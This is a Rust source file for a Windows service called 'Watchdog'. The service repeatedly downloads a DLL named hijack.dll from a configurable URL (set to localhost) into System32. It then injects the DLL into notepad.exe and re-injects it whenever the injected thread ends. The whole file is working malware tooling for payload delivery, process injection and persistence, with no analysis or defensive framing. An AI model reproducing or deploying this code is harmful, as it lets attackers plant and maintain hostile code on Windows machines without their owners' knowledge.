#[macro_use]
extern crate windows_service;

use windows_service::{
    service_dispatcher,
    service::{
        ServiceControl, ServiceControlAccept, ServiceExitCode, ServiceState, ServiceStatus,
        ServiceType,
    },
    service_control_handler::{self, ServiceControlHandlerResult}
};

use std::{
    ffi::OsString,
    os::windows::ffi::OsStringExt,
    error::Error,
    thread::sleep,
    time::Duration,
    fs::File,
    path::Path,
    io::copy
};

use windows::{
    Win32::{
        Foundation::{CloseHandle, HANDLE, WAIT_OBJECT_0, INVALID_HANDLE_VALUE},
        System::{
            Diagnostics::{
                ToolHelp::{CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, TH32CS_SNAPPROCESS, PROCESSENTRY32W},
            },
            Threading::{WaitForSingleObject, ResumeThread},
        }
    }
};

mod injector;

const PROCESS_NAME : &str = "notepad.exe";
const DLL_PATH : &str = "C:\\Windows\\System32\\hijack.dll";
const SERVICE_NAME : &str = "Watchdog";
const DOWNLOAD_URL : &str = "http://127.0.0.1";

fn find_process_id(process_name : &str) -> Result<u32, Box<dyn Error>> {

    unsafe {
        let snapshot : HANDLE = 
            CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0).unwrap();

        if snapshot == INVALID_HANDLE_VALUE {
            panic!("Failed to take process snapshot!");
        }

        let mut process : PROCESSENTRY32W = PROCESSENTRY32W::default();
        process.dwSize = size_of::<PROCESSENTRY32W>() as u32;

        if Process32FirstW(snapshot, &mut process).is_err() {
            CloseHandle(snapshot)?;
            panic!("Failed to open the first process!");
        }
        
        loop {
            let exe_name = {
                let len = process.szExeFile.iter().position(|&c| c == 0).unwrap_or(260);
                OsString::from_wide(&process.szExeFile[..len])
                    .to_string_lossy()
                    .into_owned()
            };

            if process_name == exe_name {
                println!("[+] Found process {} with pid {}!", process_name, process.th32ProcessID);
                CloseHandle(snapshot)?;
                return Ok(process.th32ProcessID);
            }

            if Process32NextW(snapshot, &mut process).is_err() { break };
        }

        CloseHandle(snapshot)?;
        Err(format!("Failed to find process {}!", process_name).into())
    }

}

fn check_alive(thread_handle : HANDLE) -> bool {
    
    unsafe {
        let result = WaitForSingleObject(thread_handle, 0);

        println!("Result: {:?}", result);

        if result == WAIT_OBJECT_0 {
            return false
        } else {
            ResumeThread(thread_handle);
            return true
        }
    };
}

fn download_file(url : &str, file_path: &str) -> Result<(), Box<dyn Error>> {
    
    let response = reqwest::blocking::get(url)?;

    if !response.status().is_success() {
        return Err(format!("Failed to download file: HTTP {}", response.status()).into());
    }

    let mut dest = File::create(file_path)?;
    let mut content = response;
    copy(&mut content, &mut dest)?;
    
    println!("[!] {} downloaded!", file_path);
    
    Ok(())
}

fn runner(thread_handle : &mut HANDLE) -> Result<(), Box<dyn Error>> {

    if *thread_handle == HANDLE::default() {
        println!("[*] No valid handle. Attempting injection...");
    } else if !check_alive(*thread_handle) {
        println!("[!] Process is no longer injected. Attempting reinjection...");
    } else {
        println!("[*] Process is still injected!");
        return Ok(());
    }
                
    let pid = find_process_id(PROCESS_NAME)?;
    *thread_handle = injector::inject_process(DLL_PATH, pid)?;
    println!("[+] Dll Injected!");

    Ok(())
}

define_windows_service!(ffi_service_main, service_main);

fn service_main(_args: Vec<OsString>) -> Result<(), Box<dyn Error>> {

    let (shutdown_tx, shutdown_rx) = std::sync::mpsc::channel();

    let status_handle = service_control_handler::register(
        SERVICE_NAME,
        move |control_event| match control_event {
            ServiceControl::Stop => {
                shutdown_tx.send(()).unwrap();
                ServiceControlHandlerResult::NoError
            },
            _ => ServiceControlHandlerResult::NotImplemented,
        },
    )?;

    status_handle.set_service_status(ServiceStatus {
        service_type: ServiceType::OWN_PROCESS,
        current_state: ServiceState::Running,
        controls_accepted: ServiceControlAccept::STOP,
        exit_code: ServiceExitCode::Win32(0),
        checkpoint: 0,
        wait_hint: Duration::default(),
        process_id: None
    })?;

    let mut thread_handle : HANDLE = HANDLE::default();
    
    while shutdown_rx.try_recv().is_err() {

        if !Path::new(DLL_PATH).is_file() {
            let _ = download_file(DOWNLOAD_URL, DLL_PATH);
        }

        let _ = runner(&mut thread_handle);
        sleep(Duration::from_secs(2));

    }

    status_handle.set_service_status(ServiceStatus {
        service_type: ServiceType::OWN_PROCESS,
        current_state: ServiceState::Stopped,
        controls_accepted: ServiceControlAccept::empty(),
        exit_code: ServiceExitCode::Win32(0),
        checkpoint: 0,
        wait_hint: Duration::default(),
        process_id: None
    })?;
    
    Ok(())
}

fn main() -> Result<(), Box<dyn Error>> {
    
    service_dispatcher::start(SERVICE_NAME, ffi_service_main)?;
    
    Ok(())
}
